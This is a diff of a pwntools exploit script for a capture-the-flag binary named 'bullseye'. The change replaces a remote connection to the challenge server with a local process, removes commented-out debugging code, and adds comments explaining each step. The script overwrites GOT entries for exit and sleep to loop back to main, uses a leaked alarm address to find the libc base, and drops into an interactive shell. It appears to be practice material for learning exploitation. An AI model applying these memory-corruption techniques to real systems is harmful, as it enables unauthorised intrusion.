@@ -4,19 +4,12 @@ context.log_level = "DEBUG"
 
 e = ELF("./bullseye")
 
-#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
-libc = ELF("./bullseye-libc-2.so")
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 
-#BSS = 0x0000000000404080
 BSS = 0x4040b0
 
 def pack_quad(quad):
     return hex(quad)[2:]
-
-
-def str_to_quad(string):
-    assert len(string) <= 8
-    return int(enhex(string.encode().ljust(8, b"\x00")[::-1]), base=16)
 
 
 def write_quad_where(stream, quad, where):
@@ -29,31 +22,18 @@ def write_quad_where(stream, quad, where):
 
 
 def init_exploit():
+    stream = process("./bullseye")
 
-    #nc jh2i.com 50031
-    stream = remote("jh2i.com", 50031)
-    #stream = process("./bullseye")
-    
-    #write_quad_where(stream, str_to_quad("/bin/sh"), BSS)
-
-    #gdb.attach(stream);
-
-    #print("Loop on sleep")
-    #write_quad_where(stream, e.symbols["main"], e.got["sleep"]) # loop on sleep
-
+    # The binary calls exit at the end of main, overwrite the GOT entry to point us
+    # back at main instead, giving us more than one write
     print("loop on exit")
     write_quad_where(stream, e.symbols["main"], e.got["exit"]) # loop on exit
 
-    #gdb.attach(stream)
-
-    #print("bypass sleep")
-    #write_quad_where(stream, e.symbols["main"] + 198, e.got["sleep"]) # Bypass sleep
-
+    # The binary leaks the address of libc
     alarm_addr = int(stream.recvline(), base=16)
     libc.address = alarm_addr - libc.symbols["alarm"]
 
-    print(f"alarm address: {hex(alarm_addr)}")
-
+    # Loop on the sleep call, so we don't have to wait another 15 seconds
     print("loop on sleep")
     write_quad_where(stream, e.symbols["main"], e.got["sleep"]) # loop on sleep
 
@@ -68,22 +48,7 @@ def init_exploit():
     return stream
 
 
-def leak_alarm(stream):
-    alarm_addr = int(stream.recvline(), base=16)
-    print(alarm_addr)
-    write_quad_where(stream, e.symbols["main"], e.got["exit"]) # Fix sleep
-
-    return alarm_addr
-
-    
 
 p = init_exploit()
-
-#gdb.attach(p)
-
-#leak_alarm(p)
-#write_quad_where(p, str_to_quad("/bin/sh"), BSS)
-
-
 p.interactive()
 
